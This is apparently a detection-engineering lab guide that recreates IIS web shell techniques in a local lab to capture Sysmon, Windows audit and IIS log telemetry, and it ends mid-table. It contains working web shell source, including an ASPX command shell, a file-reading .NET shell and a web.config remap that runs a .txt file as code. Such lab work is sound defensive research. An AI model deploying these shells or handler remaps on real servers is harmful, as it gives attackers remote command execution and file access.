# TRR0000 Lab Recreation Guide

## Overview

**Objective:** Recreate each procedure identified in TRR0000 (File-Based Web Shell Execution via IIS) in a controlled lab environment, capture telemetry mapped in the DDM, validate detection opportunities, and develop detection specifications.

**TRR Reference:** TRR0000 — T1505.003 — File-Based Web Shell Execution via IIS

---

## Procedures Under Test

| ID | Name | Summary | Key Telemetry |
|----|------|---------|---------------|
| TRR0000.WIN.A | Web Shell with OS Command Execution | ASPX/ASP shell spawns child process (cmd.exe, powershell.exe) via w3wp.exe | Sysmon 1, Win 4688 |
| TRR0000.WIN.B | Web Shell with In-Process Execution | ASPX shell operates exclusively through .NET APIs — no child process | Sysmon 11, IIS W3C, Win 4663 (SACL) |
| TRR0000.WIN.C | Web Shell via web.config Manipulation | Attacker writes/modifies web.config to change handler mappings | Sysmon 11 (web.config), FIM |

---

## Lab Environment

### Host Machine (IIS Target)

All testing was performed directly on the host Windows machine. No VMs were used for the IIS target or test execution.

| Component | Detail |
|-----------|--------|
| OS | Microsoft Windows 11 Pro |
| Version | 10.0.26200 Build 26200 |
| Processor | Intel Core i9-14900, 2000 MHz, 24 Cores, 32 Logical Processors |
| RAM | 64.0 GB |
| Time Zone | Eastern Standard Time |
| BIOS Mode | UEFI |
| Secure Boot | On |
| VBS | Running — Hypervisor enforced Code Integrity |

### Available VMs (VMware Workstation Pro)

The following VMs were available but not required for the core testing. They can serve as attacker machines or log collection infrastructure if extending the lab to include network-based testing.

| VM | Role | Notes |
|----|------|-------|
| Kali Linux | Attacker machine | HTTP requests to IIS, web shell interaction |
| Fedora Server | Log collection (optional) | Available for ELK stack if needed |
| Ubuntu | General purpose | Available if needed |

### Network Notes

> **IMPORTANT:** IIS is running on a daily-use workstation. Ensure IIS bindings are restricted to localhost and/or VMware host-only/NAT networks only. Do not expose to the broader network.

---

## Phase 1: IIS Installation & Configuration

### Step 1.1 — Create System Restore Point

Create a system restore point before making any changes. This allows full rollback of IIS installation and all subsequent configuration.

```powershell
Checkpoint-Computer -Description "Pre-TRR0000-Lab" -RestorePointType MODIFY_SETTINGS
```

### Step 1.2 — Install IIS with Required Features

Install IIS with all features required for TRR0000 testing via elevated PowerShell:

```powershell
$features = @(
    "IIS-WebServerRole",
    "IIS-WebServer",
    "IIS-CommonHttpFeatures",
    "IIS-DefaultDocument",
    "IIS-DirectoryBrowsing",
    "IIS-HttpErrors",
    "IIS-StaticContent",
    "IIS-HealthAndDiagnostics",
    "IIS-HttpLogging",
    "IIS-LoggingLibraries",
    "IIS-RequestMonitor",
    "IIS-Security",
    "IIS-RequestFiltering",
    "IIS-Performance",
    "IIS-HttpCompressionStatic",
    "IIS-WebServerManagementTools",
    "IIS-ManagementConsole",
    "IIS-ApplicationDevelopment",
    "IIS-ASP",
    "IIS-ASPNET45",
    "IIS-NetFxExtensibility45",
    "IIS-ISAPIExtensions",
    "IIS-ISAPIFilter",
    "IIS-ApplicationInit"
)

Enable-WindowsOptionalFeature -Online -FeatureName $features -All
```

**Expected result:** Installed successfully. No reboot should be required.

**Why each feature matters (DDM mapping):**

| Feature | Purpose | DDM Relevance |
|---------|---------|---------------|
| IIS-ASP | Classic ASP handler (`*.asp`) | Procedures A/B — classic ASP web shells |
| IIS-ASPNET45 | ASP.NET handler (`*.aspx`) | Procedures A/B/C — ASP.NET web shells |
| IIS-ISAPIExtensions | Required for classic ASP pipeline | Pipeline dependency |
| IIS-ISAPIFilter | Required for ISAPI module chain | Pipeline dependency |
| IIS-ApplicationInit | Application Initialization module | Procedure C — auto-trigger persistence variant |
| IIS-HttpLogging | IIS W3C request logging | Telemetry source across all procedures |
| IIS-ManagementConsole | IIS Manager GUI | Configuration and verification |

### Step 1.3 — Verify IIS Installation

**Service check:**
```powershell
Get-Service W3SVC
```
Expected: W3SVC (World Wide Web Publishing Service) running.

**Browser check:**
```powershell
Start-Process "http://localhost"
```
Expected: Default IIS welcome page displays successfully.

### Step 1.4 — Verify Handler Mappings
```powershell
Import-Module WebAdministration
Get-WebHandler | Format-Table Name, Path, Modules -AutoSize
```

**Key handlers confirmed for testing:**

| Handler Name | Path | Module | DDM Relevance |
|-------------|------|--------|---------------|
| ASPClassic | `*.asp` | IsapiModule | Procedures A/B (classic ASP shells) |
| PageHandlerFactory-ISAPI-4.0_64bit | `*.aspx` | IsapiModule | Procedures A/B/C (ASP.NET shells, classic mode) |
| PageHandlerFactory-Integrated-4.0 | `*.aspx` | ManagedPipelineHandler | Procedures A/B/C (integrated mode) |
| StaticFile | `*` | StaticFileModule | Procedure C exploits this — web.config redirects static extensions to ASP.NET |

Full handler list includes both 32-bit and 64-bit ISAPI variants plus integrated pipeline handlers for `.aspx`, `.ashx`, `.asmx`, `.cshtml`, `.vbhtml`, and others.

---

## Phase 2: Sysmon Deployment

### Step 2.1 — Download Sysmon
```powershell
New-Item -Path "C:\Tools\Sysmon" -ItemType Directory -Force
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "C:\Tools\Sysmon\Sysmon.zip"
Expand-Archive -Path "C:\Tools\Sysmon\Sysmon.zip" -DestinationPath "C:\Tools\Sysmon" -Force
```

**Expected files:**

| File | Size |
|------|------|
| Sysmon.exe | ~8.5 MB |
| Sysmon64.exe | ~4.5 MB |
| Sysmon64a.exe | ~5.0 MB |
| Eula.txt | ~7.5 KB |

This guide was tested with Sysmon v15.15. Use `Sysmon64.exe` on x64 systems.

### Step 2.2 — Create Custom Sysmon Configuration
**Config file:** `C:\Tools\Sysmon\trr0000_sysmon_config.xml`

This is a focused configuration tailored to TRR0000 DDM telemetry requirements, not a general-purpose config. Running on a daily-use host means we filter aggressively to keep noise manageable.

```powershell
@'
<Sysmon schemaversion="4.90">
  <EventFiltering>
    
    <!-- EVENT ID 1: Process Create -->
    <!-- DDM: Process Spawn operation (Procedure A) -->
    <!-- Captures w3wp.exe spawning child processes -->
    <RuleGroup name="ProcessCreate" groupRelation="or">
      <ProcessCreate onmatch="include">
        <ParentImage condition="image">w3wp.exe</ParentImage>
        <Image condition="image">w3wp.exe</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- EVENT ID 3: Network Connection -->
    <!-- DDM: Side-effect telemetry for Procedure B (.NET API network calls) -->
    <RuleGroup name="NetworkConnect" groupRelation="or">
      <NetworkConnect onmatch="include">
        <Image condition="image">w3wp.exe</Image>
      </NetworkConnect>
    </RuleGroup>

    <!-- EVENT ID 11: File Create -->
    <!-- DDM: Create New File (Procs A/B), Write Config (Proc C) -->
    <RuleGroup name="FileCreate" groupRelation="or">
      <FileCreate onmatch="include">
        <TargetFilename condition="contains">inetpub</TargetFilename>
        <TargetFilename condition="contains">Temporary ASP.NET Files</TargetFilename>
        <TargetFilename condition="contains">web.config</TargetFilename>
      </FileCreate>
    </RuleGroup>

    <!-- EVENT ID 12/13/14: Registry Events -->
    <!-- DDM: Side-effect telemetry -->
    <RuleGroup name="RegistryEvent" groupRelation="or">
      <RegistryEvent onmatch="include">
        <Image condition="image">w3wp.exe</Image>
      </RegistryEvent>
    </RuleGroup>

    <!-- EVENT ID 23: File Delete -->
    <!-- Useful for cleanup detection -->
    <RuleGroup name="FileDelete" groupRelation="or">
      <FileDelete onmatch="include">
        <TargetFilename condition="contains">inetpub</TargetFilename>
      </FileDelete>
    </RuleGroup>

  </EventFiltering>
</Sysmon>
'@ | Out-File -FilePath "C:\Tools\Sysmon\trr0000_sysmon_config.xml" -Encoding UTF8
```

**Sysmon Event ID to DDM Operation Mapping:**

| Sysmon Event ID | Event Type | DDM Operation | Procedure Coverage |
|----------------|------------|---------------|-------------------|
| 1 | Process Create | Process Spawn | A (primary), C (when shell spawns process) |
| 3 | Network Connection | Side-effect of .NET API calls | B (outbound connections from w3wp.exe) |
| 11 | File Create | Create New File / Write Config | A, B (new file), C (web.config creation) |
| 12/13/14 | Registry Events | Side-effect telemetry | B (registry access via .NET APIs) |
| 23 | File Delete | Cleanup activity | Post-exploitation |

### Step 2.3 — Install Sysmon with Custom Config
```powershell
C:\Tools\Sysmon\Sysmon64.exe -accepteula -i C:\Tools\Sysmon\trr0000_sysmon_config.xml
```

**Expected output:**
```
System Monitor v15.15 - System activity monitor
By Mark Russinovich and Thomas Garnier
Copyright (C) 2014-2024 Microsoft Corporation
Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
Sysinternals - www.sysinternals.com
Loading configuration file with schema version 4.90
Configuration file validated.
Sysmon64 installed.
SysmonDrv installed.
Starting SysmonDrv.
SysmonDrv started.
Starting Sysmon64..
Sysmon64 started.
```

**Verification:**
```powershell
Get-Service Sysmon64
# Status: Running
```

### Step 2.4 — Verify Sysmon Logging

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5 | Format-List Id, TimeCreated, Message
```

Verify Sysmon is capturing events. Background noise (e.g., Docker, system services) may appear, but the include-only filters for Event IDs 1, 3, 11, and 12–14 target `w3wp.exe` and `inetpub` paths specifically, keeping test telemetry clean.

---

## Phase 3: Windows Audit Policy Configuration

### Step 3.1 — Enable Process Creation Auditing (Event 4688)
Required for Procedure A — provides an additional telemetry source for process spawn detection alongside Sysmon Event ID 1.

```powershell
# Enable process creation auditing
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Enable command-line logging in process creation events
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
```

**Verification:**
```
System audit policy
Category/Subcategory                      Setting
Detailed Tracking
  Process Creation                        Success and Failure
```

### Step 3.2 — Configure Object Access Auditing & SACL (Event 4663)
Required for Procedure B blind spot coverage — detects file modification of existing files in the web root, which Sysmon 11 does not capture.

```powershell
# Enable object access auditing
auditpol /set /subcategory:"File System" /success:enable /failure:enable

# Set SACL on the IIS web root directory
$acl = Get-Acl "C:\inetpub\wwwroot"
$auditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
    "Everyone",
    "Write,Delete,ChangePermissions",
    "ContainerInherit,ObjectInherit",
    "None",
    "Success,Failure"
)
$acl.AddAuditRule($auditRule)
Set-Acl "C:\inetpub\wwwroot" $acl
```

**Verification:**
```
System audit policy
Category/Subcategory                      Setting
Object Access
  File System                             Success and Failure
```

Expected SACL output:
```
FileSystemRights  : Write, Delete, ChangePermissions
AuditFlags        : Success, Failure
IdentityReference : Everyone
IsInherited       : False
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : None
```

### Step 3.3 — Configure IIS W3C Logging

Ensure IIS logs capture the fields needed for web shell request analysis.

Required fields: date, time, s-ip, cs-method, cs-uri-stem, cs-uri-query, s-port, cs(User-Agent), cs(Referer), sc-status, sc-substatus, sc-win32-status, time-taken

The default IIS W3C logging configuration includes all of the above fields except `cs(Referer)`. For this lab, the default configuration was sufficient — all required telemetry was captured in IIS logs across all three procedures. To add the Referer field or verify configuration:

```powershell
# Check current log fields
Import-Module WebAdministration
Get-ItemProperty "IIS:\Sites\Default Web Site" -Name logFile

# Or configure via IIS Manager:
# Sites → Default Web Site → Logging → Select Fields
```

---

## Phase 4: Web Shell Test Files

### Step 4.0 — Create Directory Structure
```powershell
New-Item -Path "C:\inetpub\wwwroot\test_shells" -ItemType Directory -Force
New-Item -Path "C:\inetpub\wwwroot\test_shells\proc_a" -ItemType Directory -Force
New-Item -Path "C:\inetpub\wwwroot\test_shells\proc_b" -ItemType Directory -Force
New-Item -Path "C:\inetpub\wwwroot\test_shells\proc_c1" -ItemType Directory -Force
New-Item -Path "C:\inetpub\wwwroot\test_shells\proc_c2" -ItemType Directory -Force
```

### Step 4.1 — Procedure A Test Shell (OS Command Execution)

**File:** `C:\inetpub\wwwroot\test_shells\proc_a\shell.aspx` (643 bytes)

Simple ASPX shell that accepts a `cmd` query parameter and passes it to `cmd.exe /c`. This triggers the Process Spawn operation in the DDM, producing Sysmon Event ID 1 with `w3wp.exe` as the parent process.

```powershell
@'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<html>
<body>
<form method="GET">
    <input type="text" name="cmd" size="50" />
    <input type="submit" value="Run" />
</form>
<pre>
<%
    if (Request.QueryString["cmd"] != null)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + Request.QueryString["cmd"];
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write(p.StandardOutput.ReadToEnd());
        p.WaitForExit();
    }
%>
</pre>
</body>
</html>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_a\shell.aspx" -Encoding UTF8
```

**DDM operations exercised:**
- Create New File (prerequisite) → file placed on disk
- Send HTTP Request → Route Request → Match Handler (`*.aspx` → PageHandlerFactory) → Execute Code → Process Spawn (`w3wp.exe` → `cmd.exe`)

### Step 4.2 — Procedure B Test Shell (In-Process Execution)

**File:** `C:\inetpub\wwwroot\test_shells\proc_b\shell.aspx` (1,678 bytes)

ASPX shell that performs operations exclusively through .NET APIs (directory listing, file read, system info). No child process is spawned, so Sysmon Event ID 1 will NOT fire — validating the blind spot documented in the TRR.

```powershell
@'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<html>
<body>
<h3>Procedure B - In-Process Web Shell (.NET API Only)</h3>
<form method="GET">
    Action:
    <select name="action">
        <option value="listdir">List Directory</option>
        <option value="readfile">Read File</option>
        <option value="info">System Info</option>
    </select>
    Path: <input type="text" name="path" size="50" value="C:\inetpub\wwwroot" />
    <input type="submit" value="Execute" />
</form>
<pre>
<%
    string action = Request.QueryString["action"];
    string path = Request.QueryString["path"];

    if (action == "listdir" && path != null)
    {
        try {
            foreach (string d in Directory.GetDirectories(path))
                Response.Write("[DIR]  " + d + "\n");
            foreach (string f in Directory.GetFiles(path))
                Response.Write("[FILE] " + f + " (" + new FileInfo(f).Length + " bytes)\n");
        } catch (Exception ex) {
            Response.Write("Error: " + ex.Message);
        }
    }
    else if (action == "readfile" && path != null)
    {
        try {
            Response.Write(File.ReadAllText(path));
        } catch (Exception ex) {
            Response.Write("Error: " + ex.Message);
        }
    }
    else if (action == "info")
    {
        Response.Write("Machine: " + Environment.MachineName + "\n");
        Response.Write("User: " + Environment.UserName + "\n");
        Response.Write("OS: " + Environment.OSVersion + "\n");
        Response.Write("CLR: " + Environment.Version + "\n");
        Response.Write("Directory: " + Environment.CurrentDirectory + "\n");
    }
%>
</pre>
</body>
</html>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_b\shell.aspx" -Encoding UTF8
```

**DDM operations exercised:**
- Create New File (prerequisite) → file placed on disk
- Send HTTP Request → Route Request → Match Handler (`*.aspx` → PageHandlerFactory) → Execute Code → Call .NET API (no process spawn)

### Step 4.3 — Procedure C Test Files (web.config Manipulation)
#### Variant 1 — Custom Handler Mapping

**Files:**
- `C:\inetpub\wwwroot\test_shells\proc_c1\web.config` (315 bytes)
- `C:\inetpub\wwwroot\test_shells\proc_c1\readme.txt` (605 bytes)

The `web.config` remaps `*.txt` files to the ASP.NET `PageHandlerFactory` and registers a build provider so ASP.NET knows how to compile `.txt` files. Both elements are required — see Procedure C lab findings for details.

**Note:** The `buildProviders` element can only be defined at the IIS Application level, not in a subdirectory. The test directories were converted to IIS Applications to support this:

```powershell
Import-Module WebAdministration
New-WebApplication -Name "test_shells/proc_c1" -Site "Default Web Site" -PhysicalPath "C:\inetpub\wwwroot\test_shells\proc_c1" -ApplicationPool "DefaultAppPool"
New-WebApplication -Name "test_shells/proc_c2" -Site "Default Web Site" -PhysicalPath "C:\inetpub\wwwroot\test_shells\proc_c2" -ApplicationPool "DefaultAppPool"
```

```powershell
# web.config — remaps .txt to ASP.NET engine with build provider
@'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.web>
        <compilation>
            <buildProviders>
                <add extension=".txt" type="System.Web.Compilation.PageBuildProvider" />
            </buildProviders>
        </compilation>
    </system.web>
    <system.webServer>
        <handlers>
            <add name="TxtAsAspx" path="*.txt" verb="*"
                 type="System.Web.UI.PageHandlerFactory"
                 resourceType="File" />
        </handlers>
    </system.webServer>
</configuration>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_c1\web.config" -Encoding UTF8

# Web shell disguised as .txt file
@'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<pre>
<%
    if (Request.QueryString["cmd"] != null)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + Request.QueryString["cmd"];
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write(p.StandardOutput.ReadToEnd());
        p.WaitForExit();
    }
    else
    {
        Response.Write("Procedure C1: This .txt file is executing as ASP.NET code.");
    }
%>
</pre>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_c1\readme.txt" -Encoding UTF8
```

**DDM operations exercised:**
- Write Config (prerequisite) → web.config placed in directory, IIS reloads config
- Create New File (prerequisite) → shell file with `.txt` extension placed on disk
- Send HTTP Request → Route Request → Match Handler (`.txt` now maps to PageHandlerFactory instead of StaticFile) → Execute Code → Process Spawn

#### Variant 2 — Custom Extension Handler Mapping

**Files:**
- `C:\inetpub\wwwroot\test_shells\proc_c2\web.config` (556 bytes)
- `C:\inetpub\wwwroot\test_shells\proc_c2\status.info` (346 bytes)

The `web.config` maps `*.info` files to the ASP.NET `PageHandlerFactory` with a build provider. The `status.info` file contains ASP.NET code that executes when requested.

```powershell
# web.config — maps .info to ASP.NET engine with build provider
@'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.web>
        <compilation>
            <buildProviders>
                <add extension=".info" type="System.Web.Compilation.PageBuildProvider" />
            </buildProviders>
        </compilation>
    </system.web>
    <system.webServer>
        <handlers>
            <add name="InfoAsAspx" path="*.info" verb="*"
                 type="System.Web.UI.PageHandlerFactory"
                 resourceType="Unspecified"
                 preCondition="integratedMode" />
        </handlers>
    </system.webServer>
</configuration>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_c2\web.config" -Encoding UTF8

# Shell file with .info extension
@'
<%@ Page Language="C#" %>
<pre>
<%
    Response.Write("Procedure C2: Inline handler mapping active.\n");
    Response.Write("Server: " + Environment.MachineName + "\n");
    Response.Write("Time: " + DateTime.Now.ToString() + "\n");
    Response.Write("User: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\n");
%>
</pre>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_c2\status.info" -Encoding UTF8
```

**DDM operations exercised:**
- Write Config (prerequisite) → web.config with handler mapping for `.info`
- Create New File (prerequisite) → shell file with `.info` extension
- Send HTTP Request → Route Request → Match Handler (`.info` maps to PageHandlerFactory) → Execute Code → Call .NET API

### Deployed File Summary

| File | Size | Procedure |
|------|------|-----------|
| `test_shells\proc_a\shell.aspx` | 643 bytes | A — OS Command Execution |
| `test_shells\proc_b\shell.aspx` | 1,678 bytes | B — In-Process Execution |
| `test_shells\proc_c1\web.config` | 315 bytes | C1 — Custom Handler Mapping |
| `test_shells\proc_c1\readme.txt` | 605 bytes | C1 — Shell disguised as .txt |
| `test_shells\proc_c2\web.config` | 556 bytes | C2 — Custom Extension Mapping |
| `test_shells\proc_c2\status.info` | 346 bytes | C2 — Shell with .info extension |

---

## Phase 5: Procedure Execution & Log Capture

### Evidence Collection Approach

**Primary evidence:** Exported log files saved to `C:\Tools\TRR0000_logs\` per procedure. These contain full structured event data and are more useful for analysis and documentation than screenshots.

**Optional screenshots:** Consider capturing browser screenshots of web shell output for visual proof of execution. Also useful for annotated DDM diagrams showing confirmed vs. unconfirmed operations.

**Per-procedure log capture template** is documented in Appendix C. Clear the Sysmon log (`wevtutil cl "Microsoft-Windows-Sysmon/Operational"`) before each procedure execution to isolate test telemetry.

### Step 5.1 — Baseline Log Snapshot

Clear the Sysmon log and create a dedicated output directory before procedure execution to isolate test telemetry.

```powershell
# Clear Sysmon log for clean test telemetry
wevtutil cl "Microsoft-Windows-Sysmon/Operational"

# Create output directory for log captures
New-Item -Path "C:\Tools\TRR0000_logs" -ItemType Directory -Force
```

### Step 5.2 — Execute Procedure A

**Test commands:**
```powershell
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_a/shell.aspx" -UseBasicParsing
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_a/shell.aspx?cmd=whoami" -UseBasicParsing
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_a/shell.aspx?cmd=ipconfig" -UseBasicParsing
```

All three returned HTTP 200. The `whoami` and `ipconfig` commands executed successfully, returning output through the web shell.

#### DDM Telemetry Validation Results

| Telemetry Source | DDM Prediction | Result | Key Evidence |
|---|---|---|---|
| Sysmon 1 (Process Create) | w3wp.exe → cmd.exe | ✅ **Confirmed** | Both commands captured with full parent-child chain |
| Win 4688 (Process Create) | w3wp.exe → cmd.exe with cmdline | ✅ **Confirmed** | Full command lines visible |
| Sysmon 11 (File Create) | ASP.NET compilation artifacts | ✅ **Confirmed** | Multiple files in Temporary ASP.NET Files |
| IIS W3C Logs | Request with query string | ✅ **Confirmed** | `cmd=whoami` and `cmd=ipconfig` in cs-uri-query |
| Win 4663 (Object Access) | File write to web root | ✅ **Confirmed** | Captured initial shell deployment |

#### Key Sysmon Event ID 1 Evidence

**`cmd.exe /c whoami` (12:09:55 PM):**
```
Image:              C:\Windows\System32\cmd.exe
CommandLine:        "cmd.exe" /c whoami
User:               IIS APPPOOL\DefaultAppPool
IntegrityLevel:     High
ParentImage:        C:\Windows\System32\inetsrv\w3wp.exe
ParentCommandLine:  c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool" -v "v4.0" ...
```

**`cmd.exe /c ipconfig` (12:10:01 PM):**
```
Image:              C:\Windows\System32\cmd.exe
CommandLine:        "cmd.exe" /c ipconfig
User:               IIS APPPOOL\DefaultAppPool
IntegrityLevel:     High
ParentImage:        C:\Windows\System32\inetsrv\w3wp.exe
ParentCommandLine:  c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool" -v "v4.0" ...
```

#### Key Win 4688 Evidence

```
New Process Name:       C:\Windows\System32\cmd.exe
Creator Process Name:   C:\Windows\System32\inetsrv\w3wp.exe
Process Command Line:   "cmd.exe" /c whoami
Account Name:           DefaultAppPool
Account Domain:         IIS APPPOOL
Token Elevation Type:   TokenElevationTypeDefault (1)
Mandatory Label:        S-1-16-12288
```

Full command text is captured in Event 4688 when command-line logging is enabled.

#### Key Sysmon Event ID 11 Evidence (ASP.NET Compilation Artifacts)

First request to `shell.aspx` triggered dynamic compilation by w3wp.exe, producing:

| File | Created By | Significance |
|------|-----------|--------------|
| `Temporary ASP.NET Files\...\shell.aspx.1184296a.compiled` | w3wp.exe | Compilation metadata |
| `Temporary ASP.NET Files\...\App_Web_y12tgnt4.dll` | csc.exe | Compiled assembly (the actual executable code) |
| `Temporary ASP.NET Files\...\y12tgnt4.cmdline` | w3wp.exe | Compiler arguments |
| `Temporary ASP.NET Files\...\y12tgnt4.out` | w3wp.exe | Compiler stdout |
| `Temporary ASP.NET Files\...\y12tgnt4.err` | w3wp.exe | Compiler stderr |
| `Temporary ASP.NET Files\...\CSC...TMP` | csc.exe | Temporary compiler output |

#### Key IIS W3C Log Evidence

```
2026-02-20 17:09:55 ::1 GET /test_shells/proc_a/shell.aspx -           80 - ::1 WindowsPowerShell/5.1 - 200 0 0 830
2026-02-20 17:09:55 ::1 GET /test_shells/proc_a/shell.aspx cmd=whoami  80 - ::1 WindowsPowerShell/5.1 - 200 0 0 314
2026-02-20 17:10:01 ::1 GET /test_shells/proc_a/shell.aspx cmd=ipconfig 80 - ::1 WindowsPowerShell/5.1 - 200 0 0 41
```

Notable: First request took 830ms (includes compilation), subsequent requests much faster (314ms, 41ms).

#### Bonus Findings (Not Explicitly Predicted by DDM)

1. **csc.exe spawn captured (Sysmon 1 + Win 4688):** The C# compiler was spawned by w3wp.exe for first-time ASPX compilation. This is the Compile ASPX sub-operation from the DDM. The 4688 event captured the full compiler command line including the `.cmdline` file path. **Detection opportunity:** `w3wp.exe` → `csc.exe` is a strong signal for dynamic ASP.NET page compilation, which is unusual in production environments where pages are pre-compiled during deployment.

2. **BAM Registry key (Sysmon 13):** w3wp.exe triggered a Background Activity Moderator registry write tracking `cmd.exe` execution under the app pool SID (`S-1-5-82-...`). Path: `HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\{AppPool SID}\...\cmd.exe`. **Forensic value:** BAM entries persist and can be used to prove that cmd.exe was executed under the IIS app pool identity, even after logs have been cleared.

3. **Timing analysis in IIS logs:** The first request to `shell.aspx` (no command) took 830ms due to compilation overhead. The command execution requests took 314ms and 41ms respectively. This timing differential could be used to identify first-access-to-shell events in historical log analysis.

#### Procedure A Detection Recommendations (Refined from Lab Results)

| Priority | Detection | Telemetry | Fidelity | Notes |
|----------|-----------|-----------|----------|-------|
| 1 | w3wp.exe spawns cmd.exe/powershell.exe | Sysmon 1 or Win 4688 | **High** | Rarely legitimate in production |
| 2 | w3wp.exe spawns csc.exe (dynamic compilation) | Sysmon 1 or Win 4688 | **Medium-High** | Unusual in prod where pages are pre-compiled |
| 3 | New .aspx files in web root | Sysmon 11 | **Medium** | Legitimate during deployments |
| 4 | ASP.NET compilation artifacts for unexpected pages | Sysmon 11 | **Medium** | Need baseline of expected compiled pages |
| 5 | IIS log: requests with cmd/command parameters | IIS W3C | **Low-Medium** | High classification difficulty |

### Step 5.3 — Execute Procedure B

Clear the Sysmon log before execution, then run all three test actions:

**Test commands:**
```powershell
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_b/shell.aspx?action=listdir&path=C:\inetpub\wwwroot" -UseBasicParsing
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_b/shell.aspx?action=readfile&path=C:\inetpub\wwwroot\iisstart.htm" -UseBasicParsing
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_b/shell.aspx?action=info" -UseBasicParsing
```

All three returned HTTP 200 with valid content (directory listings, HTML content, system info). The shell operates entirely through .NET APIs — no child processes.

#### DDM Telemetry Validation Results — BLIND SPOT CONFIRMED

| Telemetry Source | DDM Prediction | Result | Evidence |
|---|---|---|---|
| Sysmon 1 (Process Create) | **No events** | ✅ **Confirmed: 0 bytes** | `proc_b_sysmon.txt` completely empty |
| Win 4688 (Process Create) | **No new events** | ✅ **Confirmed** | Only stale Procedure A events in log |
| Win 4663 (Object Access) | Possible file access | ❌ **Not triggered** | SACL audits Write/Delete, but Proc B only Reads |
| IIS W3C Logs | Requests logged | ✅ **Confirmed** | All three requests visible with HTTP 200 |

#### Key IIS W3C Log Evidence

```
2026-02-20 18:43:52 ::1 GET /test_shells/proc_b/shell.aspx action=listdir&path=C:%5Cinetpub%5Cwwwroot  200 0 0 1
2026-02-20 18:43:52 ::1 GET /test_shells/proc_b/shell.aspx action=readfile&path=C:...iisstart.htm      200 0 0 0
2026-02-20 18:43:52 ::1 GET /test_shells/proc_b/shell.aspx action=info                                 200 0 0 0
```

Response times: 1ms, 0ms, 0ms. No compilation overhead because the ASPX was already compiled from an earlier access (which took ~647ms due to first-time compilation).

#### 4663/SACL Analysis — Important Finding

The SACL didn't fire for w3wp.exe's file reads because the SACL audits **Write, Delete, ChangePermissions** — but Procedure B only performs **Read** operations (`Directory.GetDirectories`, `File.ReadAllText`). Adding `ReadData` to the SACL would catch this, but in production that would generate enormous noise from every legitimate page request reading files. This is exactly the classification challenge the TRR warns about.

#### Blind Spot Assessment

An attacker running a Procedure B web shell (in-process .NET API only) leaves almost no footprint beyond:

1. **Initial file creation** (Sysmon 11) — only if they create a *new* file, not if they inject code into an existing one
2. **IIS request logs** — but with severe classification difficulty (how do you distinguish a web shell request from a legitimate page?)
3. **ASP.NET compilation artifacts** (Sysmon 11) — on first access only, and only if the page wasn't already compiled
4. **Nothing else** — no process creation, no registry, no network, no file access audit

This is the lowest-visibility scenario documented in the TRR. The lab has empirically confirmed that Procedure B evades all process-based detection mechanisms.

### Step 5.4 — Execute Procedure C (Both Variants)

Clear the Sysmon log before execution.

#### Setup Issue: buildProviders Requirement Discovered

Initial attempts to execute Procedure C failed with HTTP 500 errors. The error message was: *"There is no build provider registered for the extension '.txt'"*

The original web.config only contained a handler mapping, but ASP.NET's compilation system also requires a **build provider** registration to know how to compile non-standard extensions. Additionally, the `<buildProviders>` element cannot be defined below the application level — it must be in a web.config at the root of an IIS Application.

**Fix applied:** Updated web.config files to include `<buildProviders>` sections, and converted `proc_c1` and `proc_c2` directories to IIS Applications:

```powershell
Import-Module WebAdministration
New-WebApplication -Name "test_shells/proc_c1" -Site "Default Web Site" -PhysicalPath "C:\inetpub\wwwroot\test_shells\proc_c1" -ApplicationPool "DefaultAppPool"
New-WebApplication -Name "test_shells/proc_c2" -Site "Default Web Site" -PhysicalPath "C:\inetpub\wwwroot\test_shells\proc_c2" -ApplicationPool "DefaultAppPool"
```

**This is a significant TRR refinement** — see "Procedure C Prerequisites" section below.

#### Test Commands Executed (After Fix)

```powershell
# C1 — .txt file executing as ASP.NET code
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_c1/readme.txt" -UseBasicParsing
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_c1/readme.txt?cmd=whoami" -UseBasicParsing

# C2 — .info file executing as ASP.NET code
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_c2/status.info" -UseBasicParsing
```

All three returned HTTP 200 after the fix. The `.txt` file executed `cmd.exe /c whoami` and the `.info` file returned server information — confirming the handler remapping worked.

#### DDM Telemetry Validation Results

| Telemetry Source | DDM Prediction | Result | Evidence |
